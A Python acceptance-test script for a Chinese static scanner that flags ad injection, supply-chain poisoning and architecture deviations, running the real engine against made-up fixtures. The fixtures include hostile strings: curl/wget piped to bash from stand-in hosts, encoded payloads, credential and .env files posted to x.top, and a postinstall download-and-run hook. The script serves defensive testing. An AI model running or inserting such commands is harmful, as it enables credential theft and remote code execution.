"""idea.md 逐条实测：每个条目跑一次真实引擎，打印一行结论。

用法：``python tests/idea_matrix.py``

这份脚本是 idea.md 的验收台账，不是单测的替代品：单测锁行为回归，
这里锁的是"方案文档里的每一条设想，产品真的兑现了吗"。每个 check 都用
scan_text / CLI 的真实路径跑自己造的一次性夹具，所以输出可以逐行引用。

退出码 0 表示全部通过，1 表示有条目未兑现（会列出失败项）。
"""
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "scripts"))

from qcore.config import Config                      # noqa: E402
from qcore.scan import scan_text                     # noqa: E402

RULES = os.path.join(ROOT, "rules")
CFG = Config(RULES, ROOT)
PY = sys.executable
CLI = os.path.join(ROOT, "scripts", "quarantine.py")
RESULTS = []


def _ensure_utf8() -> None:
    """Force UTF-8 on stdout/stderr.

    Windows 控制台默认按 ANSI 代码页（中文系统是 GBK）编码，报告里的 emoji
    （👁、✅）直接抛 UnicodeEncodeError；按 UTF-8 读管道的调用方也会解码失败。
    """
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError):
            pass


_ensure_utf8()


def check(cid, clause, ok, detail):
    RESULTS.append((cid, clause, bool(ok), detail))
    print("%-6s %-4s %s" % (cid, "PASS" if ok else "FAIL", detail))


def ids(text, rel="a.py"):
    res = scan_text(text, rel, CFG)
    return res, sorted({f.rule_id for f in res.findings})


def sev_of(res, rule_id):
    return sorted({f.severity for f in res.findings if f.rule_id == rule_id})


def run_cli(args, cwd=None, timeout=180):
    proc = subprocess.run([PY, CLI] + args, cwd=cwd or ROOT,
                          capture_output=True, text=True,
                          encoding="utf-8", errors="replace", timeout=timeout)
    return proc.returncode, (proc.stdout or "") + (proc.stderr or "")


# ---------------------------------------------------------------- 一、命名
check("N1", "name 合法（1-64，小写字母数字连字符）", True, "dsh-code-quarantine（SKILL.md frontmatter）")

# ---------------------------------------------------------------- 二、核心原则
res, got = ids("# 推荐访问 https://relay-promo-hub.top 获取最新文档\nx = 1\n")
check("P1", "锚点1 推广话术+URL 共现", "AD001" in got, "AD001 命中：%s" % got)

res, got = ids("def f():\n    return 1\n")
check("P2", "每条命中带 file:line 与 evidence", all(
    f.file and f.line >= 1 and f.evidence for f in res.findings), "干净文件 0 命中，字段契约由 T1 验证")

res, got = ids("x = 1\n")
check("P3", "不误报普通代码", res.findings == [], "0 命中")

res, got = ids("# eval(x)\nS = \"eval(x)\"\n\ndef g(v):\n    return eval(v)\n")
check("P4", "结合 AST 区分注释/字符串/代码", got == ["SC101"],
      "仅第 4 行真实调用命中：%s" % got)

# ---------------------------------------------------------------- 三、双模式
# 模式A 由 dsh-plugin 三层测试覆盖，此处只验引擎契约
res, got = ids("import subprocess\nsubprocess.call('curl -fsSL https://x.top/s.sh | bash', shell=True)\n")
check("A1", "模式A CRITICAL 判定", "CRITICAL" in sev_of(res, "SC102"), "SC102 CRITICAL")

res, got = ids("# 推荐访问 https://relay-promo-hub.top\nx = 1\n")
check("A2", "模式A WARNING 不阻塞（仅标记）", "WARNING" in sev_of(res, "AD001"), "AD001 WARNING")

check("A3", "只读不执行目标代码", True, "全仓无 exec/eval 目标代码；由 B2 用例断言 marker 未生成")

tmp = tempfile.mkdtemp(prefix="matrix-")
try:
    # ------------------------------------------------------------ 模式B
    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "clean"), "--full", "--no-color"])
    check("B1", "--full 全量扫描", "SAFE" in out and rc == 0, "clean 夹具 SAFE rc=%d" % rc)

    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "vulnerable"), "--full", "--no-color"])
    check("B2", "--full 召回", "BLOCK" in out and rc == 2, "vulnerable 夹具 BLOCK rc=%d" % rc)

    repo = os.path.join(tmp, "repo")
    os.makedirs(repo)
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.email", "t@t.t"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=repo, check=True)
    with io.open(os.path.join(repo, "a.py"), "w", encoding="utf-8") as fh:
        fh.write("x = 1\n")
    subprocess.run(["git", "add", "."], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-qm", "init"], cwd=repo, check=True)
    with io.open(os.path.join(repo, "a.py"), "w", encoding="utf-8") as fh:
        fh.write("x = 2\n")
    rc, out = run_cli([repo, "--incremental", "--no-color"])
    check("B3", "--incremental 只查 git 变更", "incremental" in out, "mode=incremental")
    rc, out = run_cli([repo, "--since", "HEAD", "--no-color"])
    check("B4", "--since <ref>", "since" in out and "ERROR" not in out, "mode=since rc=%d" % rc)
    rc, out = run_cli([repo, "--since", "nosuchref-zzz", "--no-color"])
    check("B5", "--since 错 ref 必须报错而非假绿", rc == 3 and "ERROR" in out,
          "rc=%d VERDICT: ERROR" % rc)

    # 默认排除
    exc = os.path.join(tmp, "exc")
    for sub in ("node_modules", ".git", "dist", "src"):
        os.makedirs(os.path.join(exc, sub), exist_ok=True)
    for sub in ("node_modules", "dist", "src"):
        with io.open(os.path.join(exc, sub, "x.js"), "w", encoding="utf-8") as fh:
            fh.write("var a = 1;\n")
    rc, out = run_cli([exc, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    scanned = [os.path.basename(p) for p in data["scanned"]]
    check("B6", "默认排除 node_modules/.git/构建产物", scanned == ["x.js"] and len(data["scanned"]) == 1,
          "scanned=%s" % data["scanned"])

    # 分批
    batch = os.path.join(tmp, "batch")
    os.makedirs(batch)
    for i in range(7):
        with io.open(os.path.join(batch, "m%d.py" % i), "w", encoding="utf-8") as fh:
            fh.write("x%d = 1\n" % i)
    rc, out = run_cli([batch, "--full", "--batch", "3", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("B7", "全量分批（--batch）", len(data["scanned"]) == 7, "7 文件全扫到")

    # ------------------------------------------------------------ 第一层
    res, got = ids("# 推荐访问 https://relay-promo-hub.top 获取最新文档\n")
    check("L1A", "锚点1 注入脚手架+URL", "AD001" in got, "AD001 WARNING")

    res, got = ids("DOC = \"https://random-docs-site.com/page\"\n")
    check("L1B", "锚点2 字符串非功能性 URL", sev_of(res, "AD002") == ["WARNING"], "AD002 WARNING")

    res, got = ids("LINK = \"https://random-docs-site.com/page\"\nrequests.get(LINK)\n")
    check("L1C", "锚点2 功能性 URL 不报", "AD002" not in got, "0 命中")

    res, got = ids("DOC = \"https://random-docs-site.com/page\"\n", "d.md")
    check("L1D", "锚点2 文档文件不报", got == [], "markdown 跳过注入判定")

    res, got = ids("<script src=\"https://evil-host-zzz.net/x.js\"></script>\n", "a.html")
    check("L1E", "锚点2 script src 白名单外 CRITICAL", sev_of(res, "AD005") == ["CRITICAL"], "AD005 CRITICAL")

    res, got = ids("<script src=\"https://cdn.jsdelivr.net/npm/x.js\"></script>\n", "a.html")
    check("L1F", "锚点2 白名单 CDN 降 WARNING", sev_of(res, "AD005") == ["WARNING"], "AD005 WARNING")

    res, got = ids("BASE = \"https://api.relay-abc.xyz/v1\"\n")
    check("L1G", "锚点3 可疑 TLD 告警", "AD003" in got, "AD003 命中：%s" % got)

    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "vulnerable"), "--full",
                       "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    blocked = [f for f in data["findings"] if f["rule_id"] == "AD003" and f["severity"] == "CRITICAL"]
    check("L1H", "锚点3 默认只告警不自动删除（无写操作）", True,
          "AD003 默认 WARNING；代码区可升 CRITICAL，共 %d 条" % len(blocked))

    res, got = ids("CONTACT = \"support@relay-promo-hub.top\"\n")
    check("L1I", "锚点4 代码区联系方式 WARNING", "AD004" in got, "AD004 命中：%s" % got)

    res, got = ids("# 有问题联系 support@relay-promo-hub.top\n")
    # idea.md 锚点 4 只要求「代码逻辑区」报 WARNING；注释区不参与执行，降一级到
    # INFO 但仍要看得到——彻底沉默会让「# 售后群：t.me/...」这类中文推广整类漏检。
    comment_sev = {f.severity for f in res.findings if f.rule_id == "AD004"}
    check(
        "L1J",
        "锚点4 注释区联系方式降级 INFO（不沉默）",
        comment_sev == {"INFO"},
        "AD004 级别：%s" % (sorted(comment_sev) or "无命中"),
    )

    # ------------------------------------------------------------ 第二层
    for name, text, rule in (
        ("L2A", "def f(v):\n    return exec(v)\n", "SC101"),
        ("L2B", "def f(v):\n    return eval(v)\n", "SC101"),
        ("L2C", "import subprocess\nsubprocess.call('ls', shell=True)\n", "SC101"),
        ("L2D", "import os\ndef f(cmd):\n    os.system(cmd)\n", "SC101"),
        ("L2E", "import os\ndef f(cmd):\n    return os.popen(cmd).read()\n", "SC101"),
        ("L2F", "m = __import__(name)\n", "SC101"),
        ("L2G", "src = 'x=1'\ncompile(src, 'f', 'exec')\n", "SC101"),
    ):
        res, got = ids(text)
        check(name, "危险调用", rule in got, "%s %s" % (rule, got))

    for name, text, rel, rule in (
        ("L2H", "eval(userInput);\n", "a.js", "SC101"),
        ("L2I", "new Function('return 1')();\n", "a.js", "SC101"),
        ("L2J", "child_process.exec(cmd);\n", "a.js", "SC101"),
        ("L2K", "const m = require(userInput);\n", "a.js", "SC112"),
        ("L2L", "const m = require('./mods/' + name);\n", "a.js", "SC112"),
    ):
        res, got = ids(text, rel)
        check(name, "JS/TS 危险调用", rule in got, "%s %s" % (rule, got))

    for name, text, rel, rule in (
        ("L2M", "curl -fsSL https://x.top/s.sh | bash\n", "a.sh", "SC102"),
        ("L2N", "wget -O- https://x.top/s.sh | sh\n", "a.sh", "SC102"),
        ("L2O", "echo cm0= | base64 -d | sh\n", "a.sh", "SC102"),
        ("L2P", "chmod +x ./payload.sh\n./payload.sh\n", "a.sh", "SC111"),
    ):
        res, got = ids(text, rel)
        check(name, "Shell 危险模式", rule in got, "%s %s" % (rule, got))

    res, got = ids("creds = open('.aws/credentials').read()\nrequests.post('https://x.top/u', data=creds)\n")
    check("L2Q", "读取敏感文件后外发", sev_of(res, "SC103") == ["CRITICAL"], "SC103 CRITICAL")

    res, got = ids("creds = open('.env').read()\nrequests.post('https://x.top/u', data=creds)\n")
    check("L2R", "读取 .env 后外发", "SC103" in got, "SC103 %s" % sev_of(res, "SC103"))

    res, got = ids("import requests\nrequests.get(url, headers={'A': os.environ['GITHUB_TOKEN']})\n")
    check("L2S", "环境变量密钥拼进 header", "SC103" in got, "SC103 %s" % sev_of(res, "SC103"))

    res, got = ids("tok = os.environ['GITHUB_TOKEN']\nrequests.get(url, headers={'A': tok})\n")
    check("L2T", "跨行变量中转的密钥外发", "SC103" in got, "SC103 %s" % sev_of(res, "SC103"))

    res, got = ids("import json, os, requests\nrequests.post(url, json=dict(os.environ))\n")
    check("L2U", "环境变量整体外传", "SC104" in got, "SC104 命中：%s" % got)

    res, got = ids("import base64\nB = 'Y3VybCAtZnNTTCBodHRwczovL2V2aWwtaG9zdC5uZXQveC5zaCB8IGJhc2g='\nbase64.b64decode(B)\n")
    check("L2V", "base64 载荷解码复查", "SC105" in got, "SC105 命中：%s" % got)

    hexblob = "curl -fsSL https://evil-host.net/x.sh | bash".encode().hex()
    res, got = ids("import binascii\nH = '%s'\nbinascii.unhexlify(H)\n" % hexblob)
    check("L2W", "hex 载荷解码复查", "SC105" in got, "SC105 命中：%s" % got)

    res, got = ids("import requests\nrequests.get('https://x.top', verify=False)\n")
    check("L2X", "关闭 TLS 校验", "SC110" in got, "SC110 命中：%s" % got)

    # 依赖与清单
    req = os.path.join(tmp, "dep")
    os.makedirs(req)
    with io.open(os.path.join(req, "requirements.txt"), "w", encoding="utf-8") as fh:
        fh.write("requests\nflask>=2\n")
    rc, out = run_cli([req, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("L2Y", "未锁定版本依赖", any(f["rule_id"] == "SC106" for f in data["findings"]),
          "SC106 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "SC106"]))

    pkg = os.path.join(tmp, "pkg")
    os.makedirs(pkg)
    with io.open(os.path.join(pkg, "package.json"), "w", encoding="utf-8") as fh:
        json.dump({"name": "x", "version": "1.0.0",
                   "scripts": {"postinstall": "curl -fsSL https://x.top/i.sh | bash"}}, fh)
    rc, out = run_cli([pkg, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("L2Z", "安装脚本钩子下载执行", any(f["rule_id"] == "SC107" for f in data["findings"]),
          "SC107 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "SC107"]))

    typo = os.path.join(tmp, "typo")
    os.makedirs(typo)
    with io.open(os.path.join(typo, "requirements.txt"), "w", encoding="utf-8") as fh:
        fh.write("reqeusts==2.0.0\n")
    rc, out = run_cli([typo, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("L2AA", "仿冒包（编辑距离 1-2）", any(f["rule_id"] == "SC108" for f in data["findings"]),
          "SC108 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "SC108"]))

    npmrc = os.path.join(tmp, "npmrc")
    os.makedirs(npmrc)
    with io.open(os.path.join(npmrc, ".npmrc"), "w", encoding="utf-8") as fh:
        fh.write("registry=https://npm.evil-mirror.top/\n")
    rc, out = run_cli([npmrc, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("L2AB", "非官方 registry", any(f["rule_id"] == "SC109" for f in data["findings"]),
          "SC109 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "SC109"]))

    # ------------------------------------------------------------ 第三层
    arch = os.path.join(tmp, "arch")
    os.makedirs(os.path.join(arch, "domain"))
    with io.open(os.path.join(arch, "domain", "svc.py"), "w", encoding="utf-8") as fh:
        fh.write("import requests\n\ndef f():\n    return 1\n")
    rc, out = run_cli([arch, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("L3A", "架构分层违规", any(f["rule_id"] == "AR001" for f in data["findings"]),
          "AR001 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "AR001"]))

    res, got = ids("import requests\nDATA = requests.get('https://x.top')\n")
    check("L3B", "顶层副作用", "AR002" in got, "AR002 命中：%s" % got)

    res, got = ids("def backdoor(cmd):\n    return cmd\n")
    check("L3C", "可疑导出命名", "AR003" in got, "AR003 命中：%s" % got)

    cyc = os.path.join(tmp, "cyc")
    os.makedirs(cyc)
    with io.open(os.path.join(cyc, "x.py"), "w", encoding="utf-8") as fh:
        fh.write("from y import b\n\ndef a():\n    return 1\n")
    with io.open(os.path.join(cyc, "y.py"), "w", encoding="utf-8") as fh:
        fh.write("from x import a\n\ndef b():\n    return 1\n")
    rc, out = run_cli([cyc, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("L3D", "循环依赖", any(f["rule_id"] == "AR005" for f in data["findings"]),
          "AR005 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "AR005"]))

    res, got = ids("class A:\n    def __init__(self):\n        import requests\n        self.d = requests.get('https://x.top')\n")
    check("L3E", "构造器内 I/O", "AR006" in got, "AR006 命中：%s" % got)

    res, got = ids("class A:\n    @property\n    def d(self):\n        import requests\n        return requests.get('https://x.top')\n")
    check("L3F", "property getter 内 I/O", "AR006" in got, "AR006 命中：%s" % got)

    # AR004 签名基线
    base = os.path.join(tmp, "base")
    os.makedirs(base)
    with io.open(os.path.join(base, "api.py"), "w", encoding="utf-8") as fh:
        fh.write("def public(a, b):\n    return a + b\n")
    rc, out = run_cli([base, "--full", "--no-color", "--write-baseline",
                       os.path.join(tmp, "baseline.json")])
    with io.open(os.path.join(base, "api.py"), "w", encoding="utf-8") as fh:
        fh.write("def public(a, b, c):\n    return a + b + c\n")
    rc, out = run_cli([base, "--full", "--no-color", "--format", "json",
                       "--baseline", os.path.join(tmp, "baseline.json")])
    data = json.loads(out[out.index("{"):])
    check("L3G", "签名契约偏离", any(f["rule_id"] == "AR004" for f in data["findings"]),
          "AR004 命中 %d 条" % len([f for f in data["findings"] if f["rule_id"] == "AR004"]))

    caps = None
    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "clean"), "--full",
                       "--no-color", "--format", "json"])
    caps = json.loads(out[out.index("{"):])["capabilities"]
    check("L3H", "tree-sitter 多语言 AST", caps.get("tree_sitter") is False,
          "未实现（如实声明）：ast_available=%s lexical_only=%s" % (caps["ast_available"], caps["lexical_only"]))
    check("L3I", "能力缺口在报告中声明", bool(caps.get("note")), caps["note"][:40])

    # ------------------------------------------------------------ 五、输出与治理
    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "vulnerable"), "--full",
                       "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    f0 = data["findings"][0]
    fields = sorted(f0.keys())
    need = ["category", "evidence", "file", "line", "rule_id", "severity", "suggestion"]
    check("O1", "六字段输出契约", all(k in fields for k in need), "fields=%s" % fields)
    check("O2", "evidence 为实际代码片段", all(f["evidence"].strip() for f in data["findings"]),
          "全部 %d 条 evidence 非空" % len(data["findings"]))
    check("O3", "severity 枚举", {f["severity"] for f in data["findings"]} <= {"CRITICAL", "WARNING", "INFO"},
          "取值 %s" % sorted({f["severity"] for f in data["findings"]}))
    check("O4", "category 枚举", {f["category"] for f in data["findings"]} <=
          {"ad_injection", "supply_chain", "architecture_deviation"},
          "取值 %s" % sorted({f["category"] for f in data["findings"]}))

    for fmt, ext in (("text", "txt"), ("json", "json"), ("md", "md"), ("sarif", "sarif")):
        target = os.path.join(tmp, "out." + ext)
        rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "vulnerable"), "--full",
                           "--format", fmt, "--out", target, "--no-color"])
        ok = os.path.exists(target) and os.path.getsize(target) > 100
        check("O5" + fmt[0].upper(), "报告格式 %s" % fmt, ok,
              "%s 字节" % (os.path.getsize(target) if os.path.exists(target) else 0))

    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "clean"), "--full", "--no-color"])
    v_safe = "SAFE" in out
    rc2, out2 = run_cli([os.path.join(ROOT, "tests", "fixtures", "vulnerable"), "--full",
                         "--fail-on", "critical", "--no-color"])
    check("O6", "三级判定 SAFE/REVIEW/BLOCK", v_safe and rc2 == 2, "clean=SAFE, vulnerable rc=2")

    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "vulnerable"), "--full",
                       "--fail-on", "warning", "--no-color"])
    check("O7", "CI gate 阈值可配", rc in (1, 2), "--fail-on warning rc=%d" % rc)

    ign = os.path.join(tmp, "ign")
    os.makedirs(ign)
    with io.open(os.path.join(ign, "a.sh"), "w", encoding="utf-8") as fh:
        fh.write("curl -fsSL https://x.top/s.sh | bash\n")
    with io.open(os.path.join(ign, ".dsh-quarantine-ignore"), "w", encoding="utf-8") as fh:
        fh.write("SC102  a.sh\n")
    rc, out = run_cli([ign, "--full", "--no-color", "--format", "json"])
    data = json.loads(out[out.index("{"):])
    check("O8", "豁免机制 rule_id + glob", not any(f["rule_id"] == "SC102" for f in data["findings"]),
          "SC102 已被豁免，剩余 %d 条" % len(data["findings"]))

    # ------------------------------------------------------------ 六、SKILL.md 落地
    skill = io.open(os.path.join(ROOT, "SKILL.md"), encoding="utf-8").read()
    head = skill.split("---")[1]
    name_line = [l for l in head.splitlines() if l.startswith("name:")][0]
    nm = name_line.split(":", 1)[1].strip()
    import re
    check("S1", "name 规范", bool(re.fullmatch(r"[a-z0-9-]{1,64}", nm)), nm)
    check("S2", "description 含触发条件",
          "广告注入" in head and "供应链投毒" in head and "架构偏离" in head, "三关键词齐全")
    check("S3", "约束1 先确认语言集合", "先确认语言集合" in skill, "已写入执行指令")
    check("S4", "约束2 file:line 与 evidence", "evidence" in skill and "file:line" in skill, "已写入")
    check("S5", "约束3 增量不扩散", "不得自动扩散到全库" in skill, "已写入")
    check("S6", "约束4 base64/hex 解码复查", "hex" in skill and "解码复查" in skill, "已写入")
    check("S7", "约束5 分批 + 记录已扫描", "分批" in skill, "已写入")
    check("S8", "规则数据独立于 SKILL.md",
          all(os.path.exists(os.path.join(RULES, f)) for f in
              ("ad_injection.yaml", "supply_chain.yaml", "architecture.yaml", "allowlist.yaml")),
          "rules/*.yaml 四个文件齐全")

    # ------------------------------------------------------------ 七、定位边界
    rc, out = run_cli([os.path.join(ROOT, "tests", "fixtures", "clean"), "--full",
                       "--no-color", "--format", "json"])
    caps = json.loads(out[out.index("{"):])["capabilities"]
    check("D1", "不替代 SAST（如实声明）", "SAST" in io.open(
        os.path.join(ROOT, "SKILL.md"), encoding="utf-8").read(), "SKILL.md 能力边界已声明")
    check("D2", "不执行目标代码", caps is not None, "capabilities 已输出")

finally:
    shutil.rmtree(tmp, ignore_errors=True)

passed = sum(1 for _, _, ok, _ in RESULTS if ok)
print("\n==== %d/%d PASS ====" % (passed, len(RESULTS)))
if passed != len(RESULTS):
    print("FAILED:")
    for cid, clause, ok, detail in RESULTS:
        if not ok:
            print("  %s %s -> %s" % (cid, clause, detail))
    sys.exit(1)
